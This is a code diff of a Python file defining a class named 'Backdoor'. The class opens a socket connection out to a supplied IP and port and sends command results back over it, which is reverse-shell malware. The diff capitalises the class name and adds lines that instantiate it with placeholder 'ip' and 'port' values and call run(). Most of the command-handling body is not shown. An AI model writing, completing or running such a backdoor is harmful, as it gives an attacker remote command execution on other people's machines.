@@ -1,7 +1,7 @@
 import socket 
 import subprocess
 
-class backdoor:
+class Backdoor:
     def __init__(self , ip , port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
@@ -20,3 +20,7 @@ class backdoor:
             connection.send(command_result)
 
         connection.close()
+
+
+my_backdoor = Backdoor("ip" , "port")
+my_backdoor.run()
